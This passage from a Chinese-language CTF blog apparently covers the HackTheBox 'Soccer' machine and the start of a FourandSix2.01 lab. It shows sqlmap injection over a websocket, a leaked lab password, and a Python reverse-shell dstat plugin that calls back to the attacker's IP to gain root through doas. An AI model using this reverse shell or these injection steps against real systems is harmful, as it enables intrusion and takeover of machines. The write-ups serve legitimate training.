class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@soccer:/$ find / -<span class="hljs-built_in">type</span> f -perm -u=s 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -u=s 2&gt;/dev/null<br>/usr/local/bin/doas<br>/usr/lib/snapd/snap-confine<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/bin/umount<br>/usr/bin/fusermount<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/newgrp<br>/usr/bin/chfn<br>/usr/bin/sudo<br>/usr/bin/passwd<br>/usr/bin/gpasswd<br>/usr/bin/chsh<br>/usr/bin/at<br>/snap/snapd/17883/usr/lib/snapd/snap-confine<br>/snap/core20/1695/usr/bin/chfn<br>/snap/core20/1695/usr/bin/chsh<br>/snap/core20/1695/usr/bin/gpasswd<br>/snap/core20/1695/usr/bin/mount<br>/snap/core20/1695/usr/bin/newgrp<br>/snap/core20/1695/usr/bin/passwd<br>/snap/core20/1695/usr/bin/su<br>/snap/core20/1695/usr/bin/sudo<br>/snap/core20/1695/usr/bin/umount<br>/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/snap/core20/1695/usr/lib/openssh/ssh-keysign<br><br></code></pre></td></tr></table></figure><p>谷歌发现</p><p><img src="/pic/4460a8360d4c92287d3442feeada7e69_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@soccer:/$ <span class="hljs-built_in">cat</span> /etc/doas.conf<br><span class="hljs-built_in">cat</span> /etc/doas.conf<br><span class="hljs-built_in">cat</span>: /etc/doas.conf: No such file or directory<br>www-data@soccer:/$ doas -h<br>doas -h<br>doas: invalid option -- <span class="hljs-string">&#x27;h&#x27;</span><br>usage: doas [-nSs] [-a style] [-C config] [-u user] <span class="hljs-built_in">command</span> [args]<br>www-data@soccer:/$ find / -name doas.conf 2&gt;/dev/null<br>find / -name doas.conf 2&gt;/dev/null<br>/usr/local/etc/doas.conf<br>www-data@soccer:/$ <span class="hljs-built_in">cat</span> /usr/local/etc/doas.conf<br><span class="hljs-built_in">cat</span> /usr/local/etc/doas.conf<br>permit nopass player as root cmd /usr/bin/dstat<br></code></pre></td></tr></table></figure><p>conf 文件给出了提示，player 用户可以在不使用密码的情况下以 root 身份运行&#x2F;usr&#x2F;bin&#x2F;dstat，那接下来的问题就是如何获取 player 用户了。</p><h2 id="子域名信息"><a href="#子域名信息" class="headerlink" title="子域名信息"></a>子域名信息</h2><p>一开始觉得可能是密码写在了配置文件里，但是重复信息收集均无果，因此看了眼 WP。这里的操作还是第一次见，去查看 <code>/etc/nginx/sites-enabled</code> 。实际上也可以从 <code>netstat -lntp</code> 出发，先看看有哪些本地 TCP 端口开放</p><p><img src="/pic/3b9cb9626088c227b2d1d41d3d28fafd_MD5.png"></p><p>发现了一些开放，但是没有权限查看 PID 的端口，因此尝试进入 nginx 目录看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@soccer:/etc/nginx$ <span class="hljs-built_in">cd</span> sites-enabled<br><span class="hljs-built_in">cd</span> sites-enabled<br>www-data@soccer:/etc/nginx/sites-enabled$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 8.0K<br>259074 drwxr-xr-x 2 root root 4.0K Dec  1  2022 .<br>259060 drwxr-xr-x 8 root root 4.0K Nov 17  2022 ..<br>256059 lrwxrwxrwx 1 root root   34 Nov 17  2022 default -&gt; /etc/nginx/sites-available/default<br>262572 lrwxrwxrwx 1 root root   41 Nov 17  2022 soc-player.htb -&gt; /etc/nginx/sites-available/soc-player.htb<br>www-data@soccer:/etc/nginx/sites-enabled$ <span class="hljs-built_in">cat</span> /etc/nginx/sites-available/soc-player.htb<br>&lt;bled$ <span class="hljs-built_in">cat</span> /etc/nginx/sites-available/soc-player.htb<br>server &#123;<br>        listen 80;<br>        listen [::]:80;<br><br>        server_name soc-player.soccer.htb;<br><br>        root /root/app/views;<br><br>        location / &#123;<br>                proxy_pass http://localhost:3000;<br>                proxy_http_version 1.1;<br>                proxy_set_header Upgrade <span class="hljs-variable">$http_upgrade</span>;<br>                proxy_set_header Connection <span class="hljs-string">&#x27;upgrade&#x27;</span>;<br>                proxy_set_header Host <span class="hljs-variable">$host</span>;<br>                proxy_cache_bypass <span class="hljs-variable">$http_upgrade</span>;<br>        &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>在这里可以获取到子域名信息，我们再次修改 hosts 文件，添加子域名和 IP 的映射，访问子域名发现，主要界面和主域名是一样的，但是增加了登录和注册的选项，尝试先注册再登录（可以顺便测一下 SQL 注入），登陆后发现只有一个搜索框，存在 SQL 注入的可能性比较高。如果输入自己的票据 id 会提示存在，随便输入会提示不存在，尝试 <code>and 1=1 </code> 和 <code>and 1=0</code>，发现语句被执行，因此可以确定存在 SQL 注入。</p><p>这里还是要先看下网页源代码，重要收获隐藏在源代码中，当然如果你使用的是 burp suite 那么可以在 target 中看到 sitemap 中有个 9091 的端口。</p><p><img src="/pic/f45be2a36a8d465750935cd8f176c063_MD5.png"></p><p>response 中提示升级到了 websocket，回到 proxy 选项，其中存在 websocket 选项卡，可以看到我们的查询内容被写在其中</p><p><img src="/pic/82d4bfbf0ae750cad90a38c54b2e8d05_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">var ws = new WebSocket(<span class="hljs-string">&quot;ws://soc-player.soccer.htb:9091&quot;</span>);<br>window.onload = <span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br><br>var btn = document.getElementById(<span class="hljs-string">&#x27;btn&#x27;</span>);<br>var input = document.getElementById(<span class="hljs-string">&#x27;id&#x27;</span>);<br><br>ws.onopen = <span class="hljs-keyword">function</span> (e) &#123;<br>    console.log(<span class="hljs-string">&#x27;connected to the server&#x27;</span>)<br>&#125;<br>input.addEventListener(<span class="hljs-string">&#x27;keypress&#x27;</span>, (e) =&gt; &#123;<br>    keyOne(e)<br>&#125;);<br><br><span class="hljs-keyword">function</span> keyOne(e) &#123;<br>    e.stopPropagation();<br>    <span class="hljs-keyword">if</span> (e.keyCode === 13) &#123;<br>        e.preventDefault();<br>        sendText();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">sendText</span></span>() &#123;<br>    var msg = input.value;<br>    <span class="hljs-keyword">if</span> (msg.length &gt; 0) &#123;<br>        ws.send(JSON.stringify(&#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: msg<br>        &#125;))<br>    &#125;<br>    <span class="hljs-keyword">else</span> append(<span class="hljs-string">&quot;????????&quot;</span>)<br>&#125;<br>&#125;<br><br>ws.onmessage = <span class="hljs-keyword">function</span> (e) &#123;<br>append(e.data)<br>&#125;<br><br><span class="hljs-keyword">function</span> append(msg) &#123;<br><span class="hljs-built_in">let</span> p = document.querySelector(<span class="hljs-string">&quot;p&quot;</span>);<br>// <span class="hljs-built_in">let</span> randomColor = <span class="hljs-string">&#x27;#&#x27;</span> + Math.floor(Math.random() * 16777215).toString(16);<br>// p.style.color = randomColor;<br>p.textContent = msg<br>&#125;<br></code></pre></td></tr></table></figure><p>其中嵌入了这样的代码，我们需要借助于搜索引擎考虑如何将其转换成更方便的利用</p><p><img src="/pic/86d2f99b2192b021f5f7c15fe511bcea_MD5.png"></p><p>可以在第一个网页中找到我们所需要的代码，修改其中的关键代码</p><p><img src="/pic/67a5c492fad96115ec4f5aea1a694a0a_MD5.png"></p><h2 id="SQLMap-爆破"><a href="#SQLMap-爆破" class="headerlink" title="SQLMap 爆破"></a>SQLMap 爆破</h2><h3 id="websocket-脚本与-SQLMap-联动"><a href="#websocket-脚本与-SQLMap-联动" class="headerlink" title="websocket 脚本与 SQLMap 联动"></a>websocket 脚本与 SQLMap 联动</h3><p>本地运行此 python 文件，同时另起一个 terminal 来执行 sqlmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sqlmap -u <span class="hljs-string">&quot;http://localhost:8081/?id=1&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span> --tables<br>        ___<br>       __H__<br> ___ ___[\&quot;]_____ ___ ___  &#123;1.7.2<span class="hljs-comment">#stable&#125;</span><br>|_ -| . [)]     | .<span class="hljs-string">&#x27;| . |</span><br><span class="hljs-string">|___|_  [(]_|_|_|__,|  _|</span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="hljs-built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage caused by this program<br><br>[*] starting @ 12:43:22 /2023-06-06/<br><br>[12:43:22] [INFO] resuming back-end DBMS <span class="hljs-string">&#x27;mysql&#x27;</span><br>[12:43:22] [INFO] testing connection to the target URL<br>[12:43:22] [WARNING] turning off pre-connect mechanism because of incompatible server (<span class="hljs-string">&#x27;SimpleHTTP/0.6 Python/3.11.2&#x27;</span>)<br>sqlmap resumed the following injection point(s) from stored session:<br>---<br>Parameter: <span class="hljs-built_in">id</span> (GET)<br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: <span class="hljs-built_in">id</span>=1 AND (SELECT 8273 FROM (SELECT(SLEEP(5)))cpyj)<br>---<br>[12:43:22] [INFO] the back-end DBMS is MySQL<br>back-end DBMS: MySQL &gt;= 5.0.12<br>[12:43:22] [INFO] fetching database names<br>[12:43:22] [INFO] fetching number of databases<br>[12:43:22] [WARNING] time-based comparison requires larger statistical model, please <span class="hljs-built_in">wait</span>.............................. (<span class="hljs-keyword">done</span>)<br><span class="hljs-keyword">do</span> you want sqlmap to try to optimize value(s) <span class="hljs-keyword">for</span> DBMS delay responses (option <span class="hljs-string">&#x27;--time-sec&#x27;</span>)? [Y/n]<br>[12:43:30] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions<br>5<br>[12:43:36] [INFO] retrieved:<br>[12:43:41] [INFO] adjusting time delay to 1 second due to good response <span class="hljs-built_in">times</span><br>mysql<br>[12:43:56] [INFO] retrieved: information_schema<br>[12:44:57] [INFO] retrieved: performance_schema<br>[12:45:55] [INFO] retrieved: sys<br>[12:46:05] [INFO] retrieved: soccer_db<br>[12:46:36] [INFO] fetching tables <span class="hljs-keyword">for</span> databases: <span class="hljs-string">&#x27;information_schema, mysql, performance_schema, soccer_db, sys&#x27;</span><br>[12:46:36] [INFO] fetching number of tables <span class="hljs-keyword">for</span> database <span class="hljs-string">&#x27;information_schema&#x27;</span><br>[12:46:36] [INFO] retrieved: 79<br>[12:46:41] [INFO] retrieved: ADMINISTRABLE_ROLE_AUTHORIZATIONS<br>[12:48:28] [INFO] retrieved: AP^C<br></code></pre></td></tr></table></figure><p>这里实在太慢了，因此直接去看了 WP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sqlmap -u <span class="hljs-string">&quot;http://localhost:8081/?id=1&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span> -T accounts --columns<br>        ___<br>       __H__<br> ___ ___[\&quot;]_____ ___ ___  &#123;1.7.2<span class="hljs-comment">#stable&#125;</span><br>|_ -| . [.]     | .<span class="hljs-string">&#x27;| . |</span><br><span class="hljs-string">|___|_  [.]_|_|_|__,|  _|</span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="hljs-built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage caused by this program<br><br>[*] starting @ 12:51:24 /2023-06-06/<br><br>[12:51:25] [INFO] resuming back-end DBMS <span class="hljs-string">&#x27;mysql&#x27;</span><br>[12:51:25] [INFO] testing connection to the target URL<br>[12:51:55] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)<br>[12:51:55] [WARNING] <span class="hljs-keyword">if</span> the problem persists please check that the provided target URL is reachable. In <span class="hljs-keyword">case</span> that it is, you can try to rerun with switch <span class="hljs-string">&#x27;--random-agent&#x27;</span> and/or proxy switches (<span class="hljs-string">&#x27;--proxy&#x27;</span>, <span class="hljs-string">&#x27;--proxy-file&#x27;</span>...)<br>[12:51:55] [WARNING] turning off pre-connect mechanism because of incompatible server (<span class="hljs-string">&#x27;SimpleHTTP/0.6 Python/3.11.2&#x27;</span>)<br>sqlmap resumed the following injection point(s) from stored session:<br>---<br>Parameter: <span class="hljs-built_in">id</span> (GET)<br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: <span class="hljs-built_in">id</span>=1 AND (SELECT 8273 FROM (SELECT(SLEEP(5)))cpyj)<br>---<br>[12:51:55] [INFO] the back-end DBMS is MySQL<br>back-end DBMS: MySQL &gt;= 5.0.12<br>[12:51:55] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns<br>[12:51:55] [INFO] fetching current database<br>[12:51:55] [INFO] resumed: soccer_db<br>[12:51:55] [INFO] fetching columns <span class="hljs-keyword">for</span> table <span class="hljs-string">&#x27;accounts&#x27;</span> <span class="hljs-keyword">in</span> database <span class="hljs-string">&#x27;soccer_db&#x27;</span><br>[12:51:55] [WARNING] time-based comparison requires larger statistical model, please <span class="hljs-built_in">wait</span>.............................. (<span class="hljs-keyword">done</span>)<br><span class="hljs-keyword">do</span> you want sqlmap to try to optimize value(s) <span class="hljs-keyword">for</span> DBMS delay responses (option <span class="hljs-string">&#x27;--time-sec&#x27;</span>)? [Y/n]<br>[12:52:02] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions<br>4<br>[12:52:02] [INFO] retrieved:<br>[12:52:12] [INFO] adjusting time delay to 1 second due to good response <span class="hljs-built_in">times</span><br>email<br>[12:52:24] [INFO] retrieved: varchar(40)<br>[12:53:00] [INFO] retrieved: <span class="hljs-built_in">id</span><br>[12:53:07] [INFO] retrieved: int<br>[12:53:18] [INFO] retrieved: password<br>[12:53:47] [INFO] retrieved: va^C<br></code></pre></td></tr></table></figure><p>再次去看了 WP，直接看来用户名和密码，回头还是得进一步记一下 sqlmap 的参数，得到了</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Username:</span> player<br><span class="hljs-symbol">Password:</span> PlayerOftheMatch2022<br></code></pre></td></tr></table></figure><p>接下来尝试 ssh 登录，成功</p><h3 id="直接使用-SQLMap-进行-websocket-类型的注入"><a href="#直接使用-SQLMap-进行-websocket-类型的注入" class="headerlink" title="直接使用 SQLMap 进行 websocket 类型的注入"></a>直接使用 SQLMap 进行 websocket 类型的注入</h3><p>实际上 SQLMap 可以直接进行 websocket 类型的注入，利用我们在 BurpSuite 中拿到的信息来进行操作，值得注意的是这里的 id 如果随便给，那么会导致 SQLMap 注入只能获取到基于时间的盲注，这也是之前速度为什么那么慢的原因</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u ws://soc-player.soccer.htb:9091 --data=<span class="hljs-string">&#x27;&#123;&quot;id&quot;:&quot;4354&quot;&#125;&#x27;</span> --batch<br></code></pre></td></tr></table></figure><p><img src="/pic/341c5ba41865757ceada48c03c1b6fb6_MD5.png"></p><p>得到的返回，确实存在注入，包括布尔型和时间盲注</p><p><img src="/pic/30e78b06c05d661518dc700c83677507_MD5.png"></p><p>接下来使用 <code>--current-db</code> 来获取数据库名字，后续就是经典操作，因为是复习回顾别人视频里的内容来查漏补缺，所以不再赘述特别详尽的操作</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>提权的话，前面已经有了思路，也就是 doas 文件以 root 权限运行 dstat。dstat 是一个监控系统服务的工具，类似于 top -n。借助于谷歌 dstat，有这样的收获，不过图中给的命令运行会出问题，感觉可能是 HTB 做了限制，不然接下来的每个人在搜索 s 权限文件的时候，就能直接获得 root 权限了，这里使用反弹 shell 的方法成功实现了提权。<a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/">Doas Privilege Escalation | Exploit Notes (hdks.org)</a></p><p><img src="/pic/77f91baf36876bbf458d06de1ecbb166_MD5.png"></p><p>再看一下 conf 文件中的提示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@soccer:/$ <span class="hljs-built_in">cat</span> /usr/local/etc/doas.conf<br><span class="hljs-built_in">cat</span> /usr/local/etc/doas.conf<br>permit nopass player as root cmd /usr/bin/dstat<br></code></pre></td></tr></table></figure><p>新建 dstat_exploit.py 文件位于&#x2F;usr&#x2F;local&#x2F;share&#x2F;dstat 中。dstat 命令的插件主要在一下两个位置保存： <code>/usr/share/dstat/</code> <code>/usr/local/share/dstat/</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket,subprocess,os;  <br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);  <br>s.connect((“&lt;your-IP&gt;”,<span class="hljs-number">2929</span>));  <br>  <br>os.dup2(s.fileno(),<span class="hljs-number">0</span>);  <br>os.dup2(s.fileno(),<span class="hljs-number">1</span>);  <br>os.dup2(s.fileno(),<span class="hljs-number">2</span>);  <br>  <br><span class="hljs-keyword">import</span> pty; pty.spawn(“/<span class="hljs-built_in">bin</span>/sh”)<br></code></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --exploit<br>/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated <span class="hljs-keyword">in</span> favour of importlib; see the module<span class="hljs-string">&#x27;s documentation for alternative uses</span><br><span class="hljs-string">  import imp</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nc -lvnp 1234<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>listening on [any] 1234 ...<br>connect to [10.10.14.145] from (UNKNOWN) [10.10.11.194] 59294<br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-comment"># cat /root/root.txt</span><br><span class="hljs-built_in">cat</span> /root/root.txt<br><br><span class="hljs-comment"># cat /home/player/user.txt</span><br><span class="hljs-built_in">cat</span> /home/player/user.txt<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>hackthebox</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>FourandSix2.01靶机</title>
    <link href="/2023/06/7015100879bb.html"/>
    <url>/2023/06/7015100879bb.html</url>
    
    <content type="html"><![CDATA[<h1 id="FourandSix2-01靶机"><a href="#FourandSix2-01靶机" class="headerlink" title="FourandSix2.01靶机"></a>FourandSix2.01靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.111<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-06 21:52 EDT<br>Warning: 192.168.56.111 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.111<br>Host is up (0.00044s latency).<br>Not shown: 61719 filtered tcp ports (no-response), 3813 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>111/tcp  open  rpcbind<br>2049/tcp open  nfs<br>MAC Address: 08:00:27:41:81:5A (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 71.15 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -O -p22,111,2049 192.168.56.111<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-06 21:53 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.111<br>Host is up (0.00030s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)<br>111/tcp  open  rpcbind 2 (RPC <span class="hljs-comment">#100000)</span><br>2049/tcp open  nfs     2-3 (RPC <span class="hljs-comment">#100003)</span><br>MAC Address: 08:00:27:41:81:5A (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: OpenBSD 6.X<br>OS CPE: cpe:/o:openbsd:openbsd:6<br>OS details: OpenBSD 6.0 - 6.4<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.25 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,111,2049 192.168.56.111<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-06 22:00 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.111<br>Host is up (0.00029s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>111/tcp  open  rpcbind<br>2049/tcp open  nfs<br>MAC Address: 08:00:27:41:81:5A (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 24.50 seconds<br></code></pre></td></tr></table></figure><h2 id="挂载-nfs"><a href="#挂载-nfs" class="headerlink" title="挂载 nfs"></a>挂载 nfs</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ showmount -e 192.168.56.111                  <br>Export list <span class="hljs-keyword">for</span> 192.168.56.111:<br>/home/user/storage (everyone)<br><br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">mkdir</span> /tmp/infosec               <br>                                                                                                                    <br>┌──(kali㉿kali)-[~]<br>└─$ mount -t nfs 192.168.56.111:/home/user/storage /tmp/infosec<br>mount.nfs: failed to apply fstab options<br></code></pre></td></tr></table></figure><p>奇怪的失败，查了以下，可能是需要 root 权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 